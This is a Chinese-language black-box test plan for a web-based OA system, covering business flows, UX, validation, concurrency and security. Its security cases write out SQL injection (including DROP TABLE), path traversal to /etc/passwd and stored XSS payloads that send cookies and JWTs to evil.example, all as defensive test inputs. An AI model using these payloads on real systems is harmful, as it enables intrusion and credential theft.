# 博渊 OA — 黑盒测试用例

**文档职责**：黑盒测试用例的唯一权威来源，自然语言描述测试步骤与期望结果，供 Phase D 执行。
**自动化原则**：用例先用自然语言定义，Playwright 自动化脚本以本文档为规格逐条实现。
**关联文档**：[../TEST_DESIGN.md](../TEST_DESIGN.md)（测试策略）、[../../DESIGN.md](../../DESIGN.md)（业务需求）
**最后更新**：2026-04-20（三 agent 综合审查：Security Engineer + UX Researcher + API Tester）
**执行环境**：前端 http://localhost:3000，后端 http://localhost:8080

---

## 测试账号

- `ceo.demo / 123456` — CEO
- `hr.demo / 123456` — HR
- `finance.demo / 123456` — 财务
- `pm.demo / 123456` — 项目经理
- `dept_manager.demo / 123456` — 部门经理
- `employee.demo / 123456` — 员工
- `worker.demo / 123456` — 劳工

---

## 分类说明

- **BB** — 业务主流程（黑盒，真实浏览器操作，无 cookie 注入）
- **SEC** — 安全测试（SQL注入、XSS、IDOR、越权、暴力破解）
- **UX** — 用户体验质量（错误提示语言、空状态、加载状态、控制台日志）
- **FV** — 表单验证（边界值、格式、类型错误）
- **CC** — 并发与幂等（双击提交、并发审批、并发结算）
- **BV** — 边界值（极值、null、空白字符）

---

## BB — 业务主流程

### BB-AUTH-01 登录与退出

前置：服务已启动，seed data 已加载。

1. 访问 http://localhost:3000，期望：自动重定向到 /login
2. 输入用户名 `employee.demo`、密码 `123456`，点击登录
   期望：跳转首页，顶栏显示"员工"角色，姓名正确
3. 点击右上角头像 → 退出登录
   期望：跳转回 /login，localStorage/cookie 已清空
4. 直接访问 http://localhost:3000/payroll（需权限的页面）
   期望：重定向到 /login 而非白屏

### BB-AUTH-02 错误密码登录

1. 访问 /login，输入用户名 `employee.demo`、密码 `wrong_password`，点击登录
   期望：停留在 /login，显示中文错误提示（如"用户名或密码错误"），不跳转
2. 确认错误提示中不含 `401`、`Unauthorized`、`token`、`stackTrace` 等技术词语

### BB-AUTH-03 角色权限隔离

1. 以 `worker.demo` 登录后，直接在地址栏输入 `/config`
   期望：重定向到首页，不进入配置页
2. 直接输入 `/payroll`
   期望：worker 可访问薪资（只看本人），不被拦截

### BB-SETUP-01 初始化向导

前置：POST /api/dev/reset-setup 将 initialized 置为 false。

1. 访问 http://localhost:3000
   期望：重定向到 /setup 向导页，而非首页
2. 按向导步骤填写公司名称、HR账号、财务账号
   期望：每步均有明确进度提示，步骤序号高亮当前步
3. 完成最后一步
   期望：提示"初始化完成"，自动跳转到 /login 而非 /setup

### BB-SETUP-02 重复初始化拦截

前置：系统已初始化（initialized = true）。

1. 直接访问 /setup
   期望：重定向到 /login 或首页，不显示向导

### BB-ORG-01 员工 CRUD

以 `hr.demo` 登录。

1. 进入"组织 → 员工管理"，点击"新建员工"
   期望：弹出新建表单，含姓名、手机、角色、部门、入职日期、员工类型字段
2. 填写完整信息后提交
   期望：成功 toast（中文），员工出现在列表
3. 点击该员工"编辑"，修改姓名
   期望：修改后列表实时更新，无需刷新页面
4. 点击"禁用"该员工
   期望：员工状态变为"已停用"，在列表中有明显标识

### BB-ORG-02 部门管理

以 `hr.demo` 登录，进入"组织 → 部门"。

1. 新建部门，填写部门名称和上级部门
   期望：成功，部门出现在部门树中
2. 编辑部门名称
   期望：修改成功，树形列表实时更新
3. 删除无员工的部门
   期望：确认弹窗 → 删除成功

### BB-ORG-03 岗位与等级管理

以 `hr.demo` 或 `finance.demo` 登录，进入"组织 → 岗位管理"。

1. 新建岗位，填写岗位名称和岗位等级
   期望：成功，岗位出现在列表
2. 编辑岗位信息
   期望：成功
3. 删除岗位（无员工关联时）
   期望：成功

### BB-FLOW-01 请假申请完整审批流

1. 以 `employee.demo` 登录，进入"考勤 → 请假申请"
2. 填写假种"年假"、开始日期、结束日期、原因，提交
   期望：成功 toast，记录出现在"我的记录"中，状态为"审批中"
3. 退出，以 `dept_manager.demo` 登录，进入"待办"
   期望：列表中出现该请假申请
4. 点击查看，填写审批意见，点击"通过"
   期望：审批成功，待办消失
5. 退出，以 `employee.demo` 登录，查看"我的记录"
   期望：请假记录状态为"已通过"

### BB-FLOW-02 请假申请驳回流

1. employee.demo 提交请假申请
2. dept_manager.demo 在待办中选择"驳回"，填写驳回原因
   期望：审批成功，驳回原因记录在审批历史
3. employee.demo 查看记录，状态为"已驳回"
   期望：驳回原因在详情页清晰展示

### BB-FLOW-03 报销申请完整流程

1. employee.demo 进入"报销 → 发起报销"
2. 填写报销标题、金额、报销明细（至少1条），提交
   期望：成功，记录出现在"我的报销"列表
3. finance.demo 进入待办，审批通过
   期望：报销状态变为"已通过"

### BB-FLOW-04 加班申请流程

1. employee.demo 提交加班申请（日期、时长、类型、原因）
2. dept_manager.demo 审批通过
   期望：状态流转正常，全程中文提示

### BB-PAY-01 薪资结算主流程

以 `ceo.demo` 或 `finance.demo` 登录。

1. 进入"薪资 → 薪资管理"，选择本月周期
2. 点击"结算"
   期望：成功 toast，周期状态变为"已结算"，可查看各员工工资条

### BB-PAY-02 工资条查看

1. 以 `employee.demo` 登录，进入"薪资 → 我的工资条"
   期望：仅显示本人工资条，金额、构成项均显示正确

### BB-ATT-01 打卡记录查看

1. 以 `employee.demo` 登录，进入"考勤 → 考勤记录"
   期望：显示本月出勤记录，无报错

### BB-PROJ-01 项目管理

以 `pm.demo` 登录。

1. 进入"项目"，点击"新建项目"
2. 填写项目名称、开始日期、负责人，提交
   期望：成功，项目出现在列表
3. 进入项目详情，添加里程碑
   期望：成功，里程碑显示在详情页

### BB-NOTIFY-01 通知中心

1. 任意角色登录后，进入通知中心
   期望：通知列表正常加载，无报错
2. 点击一条未读通知，状态变为"已读"
   期望：顶栏未读数角标减少

---

## SEC — 安全测试

### SEC-01 登录 SQL 注入

操作：POST /api/auth/login，username = `' OR '1'='1`，password = `x`
期望：返回 401，响应体不含 SQL 错误文本或堆栈，不登录成功

### SEC-02 登录 SQL 注释注入

操作：POST /api/auth/login，username = `admin'--`，password = `anything`
期望：401，无 SQL 异常泄漏

### SEC-03 员工姓名 SQL 注入

操作：POST /api/employees，name = `Test'; DROP TABLE employees;--`，其他字段合法
期望：201（字面量存储）或 400，不触发表删除，后续 /api/employees 仍正常返回

### SEC-04 请假原因 SQL UNION 注入

操作：POST /api/forms（leave），reason = `' UNION SELECT username,password,null FROM employees--`
期望：存为字面量或 400，不返回数据库内容

### SEC-05 请假原因 XSS（存储型）

操作：提交 reason = `<img src=x onerror='fetch("https://evil.example/?c="+document.cookie)'>`
期望：detail 页渲染时 HTML 转义，浏览器 Network 无对 evil.example 的请求

### SEC-06 员工姓名 XSS（存储型）

操作：POST /api/employees，name = `<script>document.location='https://evil.example/c?'+document.cookie</script>`
期望：HR/CEO 查看员工列表时 script 不执行，网络无外泄请求

### SEC-07 报销标题 SVG XSS

操作：POST /api/forms（expense），title = `<svg onload=alert(1)>`
期望：审批人查看报销详情时无 alert，文本显示转义内容

### SEC-08 假期类型名称 XSS

操作：POST /api/attendance/leave-types，name = `"><script>alert(1)</script>`
期望：浏览假期类型列表时不执行脚本

### SEC-09 工伤描述 XSS + JWT 泄漏尝试

操作：POST /api/forms（injury），description = `<script>new Image().src='https://evil.example/?t='+localStorage.getItem('token')</script>`
期望：渲染转义，Network 无 evil.example 请求，JWT 不泄漏

### SEC-10 IDOR — 查看他人表单

操作：以 employee.demo 提交请假，获得 form_id。然后以另一账号 token 调 GET /api/forms/{form_id}
期望：403 或 404，不返回该表单详情

### SEC-11 IDOR — 查看他人工资条

操作：以 employee.demo token 遍历 GET /api/payroll/payslips/{1..50}
期望：只有属于本人的工资条返回 200，其余 403 或 404

### SEC-12 IDOR — 修改他人员工档案

操作：以 employee.demo 调 PUT /api/employees/{hr_employee_id}，body 含 roleCode = `ceo`
期望：403 Forbidden

### SEC-13 无 Token 访问受保护接口

操作：不带 Authorization header 调 POST /api/forms/leave
期望：401 Unauthorized，不创建表单

### SEC-14 伪造 JWT Payload（角色篡改）

操作：取有效 JWT，Base64 解码 payload，将 role 改为 `ceo`，不重新签名，发送 POST /api/payroll/settle
期望：401 或 403（签名校验失败）

### SEC-15 disabled 账号 Token 仍有效

操作：HR 禁用 employee.demo；在 24 小时内用旧 token 调 GET /api/employees
期望：401 或 403（服务器每次请求校验账号激活状态）

### SEC-16 低权限调高权限接口

操作：以 employee.demo token 调 POST /api/payroll/cycles/1/settle
期望：403 Forbidden

### SEC-17 高频登录（暴力破解）

操作：60 秒内向 POST /api/auth/login 发送 200 次错误密码请求
期望：若无限流，记录为高风险发现（CRITICAL）；若有限流，N 次后返回 429 或账号锁定

### SEC-18 高频表单提交（幂等性）

操作：10 秒内发送 50 次相同请假表单（同一账号、同一日期范围）
期望：业务层去重或返回 409；最多创建 1 条记录；记录实际创建数量

### SEC-19 超大 Payload（items 数组）

操作：POST /api/forms（expense），items 数组含 10,000 个对象
期望：400 或 413，不造成服务器内存耗尽；响应时间 < 5 秒

### SEC-20 超长字符串字段

操作：POST /api/forms（leave），reason = 1,000,000 个字符的字符串
期望：400（字段超长）或 413，不写库

### SEC-21 负数报销金额

操作：POST /api/forms（expense），totalAmount = -9999.99
期望：400，@Positive 约束生效

### SEC-22 加班时长越界

操作：POST /api/forms（overtime），hours = 999
期望：400，时长必须有合理上限约束（≤24或配置最大值）

### SEC-23 并发结算（竞争条件）

操作：两个 ceo.demo session 同时发送 POST /api/payroll/cycles/1/settle
期望：一个 200，另一个 400/409；不产生重复结算记录

### SEC-24 质量参数注入（Mass Assignment）

操作：POST /api/employees，body 额外注入字段 `{"id":1,"salary":999999,"role":"ceo","createdAt":"2020-01-01"}`
期望：额外字段被忽略，DTO 只绑定声明字段，无权限升级

### SEC-25 文件路径穿越（附件下载）

操作：GET /api/attachments/../../../etc/passwd 或类似路径遍历
期望：400 或 404，不返回服务器文件内容

---

## UX — 用户体验质量

### UX-01 登录失败提示语言

操作：输入不存在用户名，点击登录
期望：显示自然中文（如"用户名或密码错误"）
红线：出现 `UsernameNotFoundException`、`401`、英文 error message 等技术词

### UX-02 403 提示语言

操作：以低权限角色访问高权限页面
期望：显示"您没有权限执行此操作"
红线：显示 `403 Forbidden`、`Access Denied`、Spring Security 拒绝原因

### UX-03 404 提示语言

操作：访问不存在项目详情页（ID 替换为 999999）
期望：友好的中文提示或重定向，不出现白屏
红线：白屏、JS 报错、原始 `404 Not Found`

### UX-04 500 提示与恢复

操作：DevTools 拦截结算请求改为 500 响应
期望：显示"服务器暂时出现问题，请稍后重试"，表单状态保留
红线：堆栈信息、NullPointerException、Raw 500 字符串显示给用户

### UX-05 表单验证消息位置

操作：请假申请提交时结束日期早于开始日期
期望：相关字段旁显示中文内联错误提示
红线：仅有 toast、英文消息 `endDate must be after startDate`

### UX-06 提交成功 Toast 内容

操作：成功提交请假申请
期望：Toast 文字为自然中文（"请假申请已提交"）
红线：`200 OK`、`POST /api/...`、`Request succeeded` 等原始响应

### UX-07 审批操作 Toast

操作：部门经理审批通过请假
期望：Toast 为"审批操作已完成"之类
红线：原始后端响应 body、HTTP 状态码

### UX-08 网络断开 Toast

操作：填表后 DevTools 切 Offline，提交报销
期望：Toast 显示"网络连接失败，请检查网络后重试"
红线：`Network Error`、`ERR_NETWORK`、`Request failed with status code 0`

### UX-09 外键约束错误 Toast

操作：删除有关联记录的员工（如有未完成审批）
期望：Toast 显示"该员工存在关联数据，无法删除"
红线：`ConstraintViolationException`、`foreign key constraint fails`

### UX-10 列表空状态

操作：新建员工账号登录，进入"我的请假记录"（无数据）
期望：显示友好空状态"暂无请假记录"，或含引导入口
红线：白屏、空 tbody、`[]`、`null`

### UX-11 薪资列表空状态

操作：进入无数据月份的薪资列表
期望：显示"本月暂无薪资记录"
红线：空白表格、`undefined`

### UX-12 搜索无结果

操作：员工列表使用不存在关键词搜索
期望：显示"未找到匹配的员工"
红线：空表格无任何说明

### UX-13 长操作加载状态

操作：点击薪资批量结算
期望：按钮立即进入 disabled 加载态，有 spinner 或进度提示，UI 不冻结
红线：按钮可重复点击，页面无响应，无任何视觉反馈

### UX-14 慢网络加载占位

操作：DevTools 调至 Slow 3G，访问考勤汇总页
期望：骨架屏或 spinner，无空白闪烁
红线：空白区域持续数秒无提示，布局抖动

### UX-15 文件上传进度

操作：在附件字段上传大文件
期望：显示上传进度，提交按钮在上传期间禁用
红线：无进度提示，按钮可重复点击

### UX-16 表单字段标签语言

操作：打开员工新建/编辑表单，逐一检查所有标签
期望：全部为中文业务用语（"员工姓名"、"所属部门"、"角色"）
红线：`employeeId`、`roleCode`、`departmentId`、`formData` 等 camelCase 字段名出现在标签上

### UX-17 下拉选项显示

操作：查看请假类型下拉菜单
期望：显示"年假"、"病假"、"调休"等中文
红线：显示 `ANNUAL`、`SICK`、`COMPENSATORY` 等枚举值

### UX-18 薪资详情字段标签

操作：查看某员工工资条详情
期望：标签为"基本工资"、"绩效奖金"、"社保扣款"等
红线：`baseSalary`、`performanceBonus`、`insuranceDeduction` 等英文字段名

### UX-19 登录时控制台日志

操作：登录后打开 DevTools Console，检查所有输出
期望：无 JWT token 字符串、无用户密码、无包含薪资数据的完整响应体
红线：console.log 输出 `{"token":"eyJ..."}` 或包含薪资金额的数组

### UX-20 薪资页控制台日志

操作：进入薪资列表页，检查 console 输出
期望：无薪资数字、员工姓名等敏感数据被 log 到控制台
红线：含 `netPay`、`baseSalary`、员工 ID 的数组被输出

### UX-21 登录失败后的恢复可用性

操作：故意输错密码登录失败
期望：用户名字段内容保留，错误提示在表单内清晰可见，用户知道下一步操作
红线：表单全部清空，错误提示在 toast 后消失无法再看到

### UX-22 必填项未填的内联错误

操作：请假申请表单不填任何内容直接提交
期望：各必填字段旁有红色内联提示，字段有红色边框
红线：仅 toast 报错且 3 秒消失，字段无视觉错误状态

### UX-23 驳回原因可见性

操作：以 employee.demo 查看已被驳回的报销申请
期望：详情页清晰展示驳回原因，状态标签明显，若可重提有明确按钮
红线：驳回原因未显示，状态仅变色无文字，无后续操作指引

### UX-24 加班超限的错误提示

操作：提交超出月度加班上限（如有业务规则）的加班申请
期望：显示具体中文原因，如"本月加班时长已超出上限"
红线：通用"提交失败"、英文原始 `overtime hours exceed maximum`

### UX-25 空部门成员展示

操作：删除某部门所有成员，刷新部门详情页
期望：成员列表显示"暂无成员"，其他元数据正常，无 JS 错误
红线：布局崩溃、`null`/`undefined` 显示为文本、页面报错

---

## FV — 表单验证

### FV-01 登录空用户名

操作：username = ""，password = "123456"，提交
期望：400 或前端阻拦，提示"请输入用户名"

### FV-02 登录 SQL 注入

操作：username = `' OR '1'='1' --`，password = `anything`
期望：401，不登录，不返回 500 或 SQL 错误

### FV-03 登录 XSS 用户名

操作：username = `<script>alert('xss')</script>`，password = `123456`
期望：401，响应中 script 标签不被反射执行

### FV-04 密码超长

操作：username = `ceo.demo`，password = 201 字符字符串
期望：400（有长度限制）或 401（仅凭证校验），不返回 500

### FV-05 Unicode 密码

操作：username = `ceo.demo`，password = `密码测试123！@#`
期望：200 OK（如凭证匹配）或 401，不出现编码错误

### FV-06 员工姓名为空

操作：POST /api/employees，name = ""，其他字段合法
期望：400，@NotBlank 触发

### FV-07 员工姓名单字符

操作：name = "A"，其他字段合法
期望：201 Created（无最短限制），姓名正常显示

### FV-08 员工姓名 200 字符

操作：name = "A" × 200
期望：201 或 400（取决于列长度约束），不返回 500

### FV-09 员工姓名 SQL 注入存储

操作：name = `Robert'); DROP TABLE employees; --`
期望：201 字面量存储，员工列表仍可正常加载，无表删除

### FV-10 员工姓名 XSS 存储

操作：name = `<img src=x onerror=alert(1)>`
期望：员工列表渲染时 HTML 转义，无 alert 执行

### FV-11 手机号格式无效

操作：phone = `abc123`，其他合法
期望：400（若有格式校验）或 201（已知缺口：无手机号格式验证）；记录实际行为

### FV-12 手机号过短

操作：phone = `12345`
期望：同 FV-11；记录实际行为

### FV-13 入职日期为未来日期

操作：entryDate = 明天日期
期望：201（如无未来日期限制）；记录是否符合业务预期

### FV-14 入职日期格式错误

操作：entryDate = `not-a-date`
期望：400（反序列化失败），不返回 500

### FV-15 部门 ID 不存在

操作：departmentId = 99999
期望：400 或 404，不创建悬空 FK 记录，不返回 500

### FV-16 部门 ID 为负数

操作：departmentId = -1
期望：400，不返回 500

### FV-17 角色码非法

操作：roleCode = `god`
期望：400，提示无效角色

### FV-18 请假日期倒置

操作：startDate > endDate
期望：400 或 201（已知缺口：Map<String,Object> 无跨字段校验）；记录实际行为

### FV-19 请假同一天

操作：startDate = endDate = 今日
期望：201，时长显示为 1 天或 0.5 天（验证显示逻辑）

### FV-20 请假类型不存在

操作：leaveType = `FAKE_TYPE`
期望：400（若服务端验证）或 201（已知缺口）；记录实际行为

### FV-21 请假原因 XSS + 超长

操作：reason = `<script>alert(1)</script>` + 10,000 字符
期望：400（超长）或 201（字面存储），渲染时不执行脚本

### FV-22 报销总金额为负

操作：totalAmount = -100
期望：400，@Positive 生效

### FV-23 报销总金额为零

操作：totalAmount = 0
期望：400，@Positive 不含零

### FV-24 报销金额超大

操作：totalAmount = 99,999,999
期望：201（无上限）或 400；验证数据库精度，显示无溢出

### FV-25 报销明细为空数组

操作：items = []
期望：400，@NotEmpty 生效

### FV-26 报销明细金额为负

操作：items[0].amount = -50
期望：201（已知缺口：单条明细无 @Positive）；记录为 defect

### FV-27 报销明细描述 XSS

操作：items[0].description = `<svg/onload=alert(1)>`
期望：字面存储；审批页渲染时无 alert

### FV-28 假期扣款比例 > 1.0

操作：deductionRatio = 2.0
期望：400（若有范围约束）或 201（已知缺口）；记录实际行为

### FV-29 假期扣款比例为负

操作：deductionRatio = -0.5
期望：400 或 201；记录实际行为

### FV-30 假期扣款比例为字符串

操作：deductionRatio = `"abc"`
期望：400（类型反序列化失败），不返回 500

### FV-31 假期名称重复

操作：新建与已有假期相同名称的假期类型
期望：400（唯一约束）或 500（DB 层约束无处理）；UI 显示"名称已存在"而非原始约束异常

---

## CC — 并发与幂等

### CC-01 双击提交请假（前端防重）

操作：填好请假表单，快速双击"提交"按钮
期望：第二次点击按钮已禁用；最终只创建 1 条请假记录
红线：创建 2 条相同记录

### CC-02 双请求同时提交（API 级）

操作：在 100ms 内向 POST /api/forms（leave）发送 2 个相同 payload 请求（同账号）
期望：一个 201，另一个 409 或 400（幂等性保护）；或两个 201 — 如后者则记录为 HIGH 风险 defect

### CC-03 并发审批同一节点

操作：两个不同 session（hr.demo + dept_manager.demo，如果两者均有权限）同时向同一审批节点发送 approve 请求
期望：一个 200，另一个 400/409（节点已处理）；不出现节点被双重通过的状态

### CC-04 并发结算同一薪资周期

操作：两个 ceo.demo session 同时 POST /api/payroll/cycles/1/settle
期望：一个 200，另一个 400/409（已结算）；DB 中不出现重复工资条

---

## BV — 边界值

### BV-01 字符串最大长度

操作：员工姓名填 100 字符（或列长上限），其他字段合法
期望：201，全量存储；详情页显示完整值

### BV-02 字符串超最大长度

操作：员工姓名填 最大长度 + 1 字符
期望：400（Spring @Size 触发）或 500（仅 DB 约束）；若 500，记录为缺口

### BV-03 历史日期（Unix Epoch）

操作：请假 startDate = `1970-01-01`
期望：201 或 400；记录是否有历史日期校验

### BV-04 极远未来日期

操作：请假 startDate = `9999-12-31`
期望：201 或 400；不返回 500（Java LocalDate 支持该值）

### BV-05 departmentId = 0

操作：POST /api/employees，departmentId = 0
期望：400（0 非有效 ID），不返回 500，不创建悬空记录

### BV-06 Integer.MAX_VALUE 金额

操作：报销 totalAmount = 2,147,483,647
期望：201 或溢出 400；验证 DB 精度，无静默溢出

### BV-07 纯空白字符串

操作：请假原因 reason = `"   "` （3 个空格）
期望：400（@NotBlank 裁剪后视为空）或 201（@NotEmpty 不裁剪）；记录实际注解

### BV-08 JSON null 值

操作：POST /api/employees，body 含 `"name": null`
期望：400（@NotBlank 或 @NotNull 捕获），不返回 500（NPE）

---

## 已知风险汇总（测试前发现的结构性缺口）

按严重程度排序，供修复优先级参考。

**CRITICAL — 测试前建议修复**

- 无登录失败限速：暴力破解无阻碍（CC-01/SEC-17）
- FormSubmitRequest.formData 为 Map<String,Object>：请假/加班/工伤所有字段无服务端类型与业务规则校验（FV-18/FV-20 等）
- JWT 24 小时有效期：禁用账号 token 仍可请求（SEC-15）

**HIGH — 应在 Phase D 修复后再人工验收**

- 无表单幂等键：双提交可创建重复记录（CC-02/SEC-18）
- 薪资结算无行级锁：并发 settle 可产生重复工资条（CC-04/SEC-23）
- 报销明细金额无 @Positive：items[].amount 可为负（FV-26）
- 手机号无格式校验（FV-11/FV-12）
- 请假日期倒置无服务端校验（FV-18）
- 假期扣款比例无 0~1 范围约束（FV-28/FV-29）

**MEDIUM — 记录在案，可在 Phase D 同步整改**

- 加班时长无上限约束（SEC-22）
- 请假类型未验证是否存在（FV-20）
- 假期名称无唯一约束或无友好错误处理（FV-31）
- BV-02：字符串超长仅靠 DB 而非 Spring 捕获（需确认）

---

## Phase D 执行流程

**Step 1 — 自动化黑盒测试（Claude 执行）**
- 运行 Playwright 脚本逐条执行 BB / SEC / UX / FV / CC / BV 用例
- 未通过的用例记录到 TODO.md Phase D 末尾（格式：D-BUG-XX）
- 所有用例执行完毕输出 Pass/Fail 矩阵

**Step 2 — 问题修复（Phase D 内）**
- D-BUG-XX 由 Backend/Frontend Engineer 逐条修复
- 每条修复通过 Code Reviewer 审计后方可关闭
- 修复后对应用例重新执行确认通过

**Step 3 — 人工走查（用户执行）**
- 所有自动化用例全部通过后，由用户在真实浏览器执行 BB-* 主流程用例
- 用户新发现的问题追加到 D-BUG 列表，同步修复

**Step 4 — 验收关闭**
- 所有 D-BUG 修复完毕，用户确认
- Phase D 模块（D-INIT/D-ORG/D-FLOW/D-PERM/D-PAY/D-ATT）逐一推进到 [x]
